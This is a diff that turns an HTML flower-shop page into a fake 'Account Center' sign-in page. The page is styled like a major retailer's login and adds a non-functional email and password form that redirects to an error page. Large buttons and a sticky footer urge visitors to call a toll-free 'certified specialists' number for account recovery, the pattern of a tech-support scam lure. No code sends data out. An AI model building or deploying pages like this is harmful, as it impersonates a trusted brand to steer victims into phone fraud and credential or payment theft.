@@ -1,155 +1,81 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Fresh Flowers Online | Gelweb.com</title>
-  <meta name="description" content="Shop fresh roses, lilies, and beautiful bouquets with free same-day delivery. Call +1 802-597-0041 or order online at Gelweb.com." />
-  <style>
-    body {
-      font-family: 'Poppins', sans-serif;
-      margin: 0;
-      background: #fff8fa;
-      color: #333;
-    }
-    header {
-      background: #ffeff5;
-      text-align: center;
-      padding: 30px 15px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-    header h1 {
-      color: #e91e63;
-      font-size: 2em;
-      margin: 0;
-    }
-    header p {
-      margin-top: 8px;
-      color: #555;
-    }
-    .hero {
-      text-align: center;
-      padding: 50px 15px;
-      background: linear-gradient(to bottom right, #fff5f9, #ffe6ef);
-    }
-    .hero h2 {
-      color: #d81b60;
-      font-size: 2rem;
-    }
-    .hero p {
-      color: #444;
-      font-size: 1rem;
-    }
-    .btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 12px 25px;
-      background: #e91e63;
-      color: #fff;
-      text-decoration: none;
-      font-weight: bold;
-      border-radius: 25px;
-      transition: 0.3s;
-    }
-    .btn:hover {
-      background: #c2185b;
-    }
-    .products {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 20px;
-      padding: 40px 20px;
-      max-width: 1100px;
-      margin: auto;
-    }
-    .card {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      padding: 15px;
-      text-align: center;
-    }
-    .card img {
-      width: 100%;
-      border-radius: 12px;
-      height: 200px;
-      object-fit: cover;
-    }
-    .card h3 {
-      color: #e91e63;
-      margin: 10px 0 5px;
-    }
-    .card p {
-      font-size: 0.9rem;
-      color: #555;
-    }
-    .cta {
-      text-align: center;
-      background: #ffe6ef;
-      padding: 50px 15px;
-    }
-    .cta h2 {
-      color: #d81b60;
-    }
-    .cta a {
-      margin-top: 20px;
-    }
-    footer {
-      background: #ffeff5;
-      text-align: center;
-      padding: 20px;
-      font-size: 0.9rem;
-      color: #444;
-    }
-    footer a {
-      color: #d81b60;
-      text-decoration: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign In - ACCOUNT CENTER</title>
+    <style>
+		.header-logo {
+    width: 50px;
+    height: 50px;
+    object-fit: contain;
+    display: CENTER;
+}
+        :root { --navy: #232F3E; --blue: #0066c0; --bg: #f3f3f3; --btn-gold: linear-gradient(to bottom, #f7dfa5, #f0c14b); }
+        body { font-family: "Segoe UI", Arial, sans-serif; margin: 0; padding: 0; background-color: #fff; color: #111; }
+        
+        header { background-color: white; padding: 20px 0; text-align: center; color: white; }
+        
+        .header-title { font-size: 18px; font-weight: bold; letter-spacing: 1px; }
+
+        .container { max-width: 380px; margin: 20px auto; padding: 0 20px; }
+        
+        .login-card { border: 1px solid #ddd; border-radius: 8px; padding: 25px; margin-bottom: 20px; }
+        h1 { font-size: 28px; font-weight: 400; margin: 0 0 15px; }
+        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; }
+        input { width: 100%; padding: 10px; margin-bottom: 18px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; outline: none; }
+        
+        .btn-signin { width: 100%; background: #0866ff; border: 1px solid #0866ff; border-radius: 3px; padding: 12px; font-size: 14px; cursor: pointer; }
+        .legal { font-size: 12px; color: #white; margin-top: 15px; line-height: 1.4; }
+
+        .divider { height: 1px; background: #ddd; margin: 30px 0; position: relative; text-align: center; }
+        .divider span { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: #fff; padding: 0 10px; color: #767676; font-size: 12px; }
+
+        .support-box { border: 1px solid #ddd; border-radius: 8px; padding: 20px; text-align: center; }
+        .support-box h3 { color: #c45500; font-size: 17px; margin-top: 0; }
+        .phone-num { font-size: 32px; font-weight: 700; color: var(--blue); text-decoration: none; display: block; margin: 10px 0; }
+
+        .sticky-footer { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 15px; border-top: 1px solid #ddd; display: flex; justify-content: center; z-index: 100; }
+        .call-btn { background: #0866ff; color: #111; text-decoration: none; width: 95%; text-align: center; padding: 16px; font-weight: 700; border-radius: 50px; border: 1px solid #0866ff; font-size: 17px; }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>Gelweb Flowers</h1>
-    <p>Fresh Blooms • Elegant Bouquets • Free Same-Day Delivery</p>
-  </header>
 
-  <section class="hero">
-    <h2>Brighten Someone’s Day with Flowers</h2>
-    <p>Order online or call us for roses, lilies, tulips, and special bouquets — hand-picked and delivered fresh to your doorstep.</p>
-    <a href="tel:+18025970041" class="btn">Call to Order: +1 802-597-0041</a>
-  </section>
+    <header>
+        <img src="logo.png" alt="Logo" class="header-logo">
+       
+    </header>
 
-  <section class="products">
-    <div class="card">
-      <img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93?auto=format&fit=crop&w=600&q=60" alt="Red Roses Bouquet">
-      <h3>Red Roses Bouquet</h3>
-      <p>Classic love symbol — perfect for every occasion. $29.99</p>
-    </div>
-    <div class="card">
-      <img src="https://images.unsplash.com/photo-1526045612212-70caf35c14df?auto=format&fit=crop&w=600&q=60" alt="Lily Arrangement">
-      <h3>Lily Arrangement</h3>
-      <p>Elegant white lilies for peace and joy. $24.99</p>
-    </div>
-    <div class="card">
-      <img src="https://images.unsplash.com/photo-1504208434309-cb69f4fe52b0?auto=format&fit=crop&w=600&q=60" alt="Tulip Mix">
-      <h3>Tulip Mix</h3>
-      <p>Colorful tulips to bring happiness to any home. $21.99</p>
-    </div>
-    <div class="card">
-      <img src="https://images.unsplash.com/photo-1520250497591-112f2f40a3f4?auto=format&fit=crop&w=600&q=60" alt="Gift Bouquet">
-      <h3>Gift Bouquet</h3>
-      <p>Custom arrangements for birthdays, anniversaries & more. $34.99</p>
-    </div>
-  </section>
+    <div class="container">
+        <div class="login-card">
+            <h1>Loin and Continue! </h1>
+            <label>Email or mobile phone number</label>
+            <input type="text">
+            <label>Password</label>
+            <input type="password">
+            <button class="btn-signin" onclick="location.href='error.html'">Sign-In for Verification</button>
+            <p class="legal">By signing in, you agree to the standard terms of service.</p>
+        </div>
 
-  <section class="cta">
-    <h2>Need Urgent Delivery?</h2>
-    <p>We deliver the same day — fresh, beautiful, and on time. </p>
-    <a href="tel:+18025970041" class="btn">📞 Call Now: +1 802-597-0041</a>
-  </section>
+        <div class="divider"><span>New to Help Center?</span></div>
 
-  <footer>
-    <p>© 2025 Gelweb.com — Your Online Flower Store | <a href="tel:+18025970041">Call Support</a></p>
-  </footer>
+        <div class="support-box">
+            <h3>Live Assistance Available 24/7</h3>
+            <p style="font-size: 13px; color: #555;">Need help with your Account, memberships, or account recovery? Our specialists are available to help you resolve technical issues and account inquiries.</p>
+            <a href="tel:+1833-297-6290" class="phone-num">1-833-297-6290</a>
+            <p style="font-size: 11px; color: #767676;">Certified specialists available 24/7.</p>
+        </div>
+
+        <div style="text-align: center; font-size: 11px; color: #888; margin: 30px 0 120px;">
+            Expert help desk assistance. Standard carrier rates may apply for calls from mobile devices.
+        </div>
+    </div>
+
+    <div class="sticky-footer">
+        <a href="tel:+1833-297-6290" class="call-btn">📞 CALL CUSTOMER CARE</a>
+    </div>
+
 </body>
+
 </html>
